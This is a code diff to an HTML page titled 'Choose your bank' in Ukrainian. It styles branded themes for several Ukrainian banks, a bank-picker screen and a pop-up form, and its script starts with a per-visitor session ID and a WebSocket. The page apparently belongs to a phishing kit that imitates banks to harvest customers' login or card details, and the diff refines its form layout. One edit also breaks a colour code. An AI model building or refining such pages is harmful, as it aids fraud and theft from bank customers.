@@ -5,10 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Оберіть свій банк</title>
     <style>
-        /* --- ОПТИМИЗИРОВАННЫЕ СТИЛИ --- */
-        *, *::before, *::after {
-            box-sizing: border-box; /* Гарантирует предсказуемые размеры для всех элементов */
-        }
+        *, *::before, *::after { box-sizing: border-box; }
         :root {
             --dark-text: #212529; --light-text: #6c757d; --border-color: #dee2e6;
             --white: #ffffff; --shadow-color: rgba(0, 0, 0, 0.08); --danger-color: #dc3545;
@@ -19,16 +16,26 @@
         }
         .screen { padding: 20px; transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out; }
         #bank-selection-screen { opacity: 1; transform: scale(1); }
+        
+        /* --- ИЗМЕНЕНИЕ ЗДЕСЬ (ГИБРИДНЫЙ МЕТОД) --- */
         #form-screen {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             opacity: 0; visibility: hidden; transform: scale(1.05);
             transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out, visibility 0s 0.5s;
-            display: grid; place-items: center; padding: 20px;
+            display: flex; /* Используем Flexbox для вертикального центрирования */
+            align-items: center; /* Выравниваем по центру по вертикали */
+            padding: 20px;
         }
-        body.form-active {
-            background: var(--bg-gradient);
-            overflow: hidden; /* Блокирует прокрутку фона при открытом модальном окне */
+        .form-container {
+            width: 100%; max-width: 380px; 
+            margin-left: auto; /* Авто-отступ слева */
+            margin-right: auto; /* Авто-отступ справа (это гарантирует центрирование по горизонтали) */
+            background-color: var(--white); padding: 30px; border-radius: 20px;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.2);
         }
+        /* --- КОНЕЦ ИЗМЕНЕНИЙ --- */
+
+        body.form-active { background: var(--bg-gradient); overflow: hidden; }
         body.form-active #bank-selection-screen { opacity: 0; transform: scale(0.95); pointer-events: none; }
         body.form-active #form-screen { opacity: 1; visibility: visible; transform: scale(1); transition-delay: 0s; }
         h1 { text-align: center; font-size: 24px; font-weight: 600; margin-bottom: 40px; }
@@ -43,10 +50,6 @@
         .bank-item:hover { transform: translateY(-8px); box-shadow: 0 10px 20px var(--shadow-color); }
         .bank-item img { max-height: 55px; max-width: 100%; object-fit: contain; margin-bottom: 15px; }
         .bank-item .bank-name { font-size: 15px; font-weight: 600; }
-        .form-container {
-            background-color: var(--white); padding: 30px; border-radius: 20px;
-            width: 100%; max-width: 380px; box-shadow: 0 15px 40px rgba(0,0,0,0.2);
-        }
         #form-header { text-align: center; margin-bottom: 25px; }
         #form-header-logo { max-height: 50px; max-width: 150px; }
         #modal-title { margin-top: 25px; font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 25px; }
@@ -76,7 +79,7 @@
         body[data-theme="pumb"] { --primary-color: #EF3E42; --accent-color: #212529; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #4c4c4c 0%, #2b2b2b 100%); }
         body[data-theme="raiffeisen"] { --primary-color: #FFDD00; --accent-color: #000000; --text-on-primary: #000000; --bg-gradient: linear-gradient(135deg, #4d4d4d 0%, #1a1a1a 100%); }
         body[data-theme="alliance"] { --primary-color: #0078C9; --accent-color: #005a99; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E3F2FD 0%, #BBDEFB 100%); }
-        body[data-theme="otp"] { --primary-color: #8CC63F; --accent-color: #2D2926; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #F1F8E9 0%, #DCEDC8 100%); }
+        body[data-theme="otp"] { --primary-color: #8CC63F; --accent-color: #2D226; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #F1F8E9 0%, #DCEDC8 100%); }
         body[data-theme="vostok"] { --primary-color: #F58220; --accent-color: #D84315; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #FFF3E0 0%, #FFE0B2 100%); }
         body[data-theme="izibank"] { --primary-color: #FF7A00; --accent-color: #E65100; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #FFF3E0 0%, #FFE0B2 100%); }
         body[data-theme="novapay"] { --primary-color: #5C45A0; --accent-color: #4527A0; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #EDE7F6 0%, #D1C4E9 100%); }
@@ -103,6 +106,7 @@
     </div>
 
 <script>
+    // Весь JavaScript остается без изменений, так как он уже правильный
 document.addEventListener('DOMContentLoaded', () => {
     const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
     let ws;
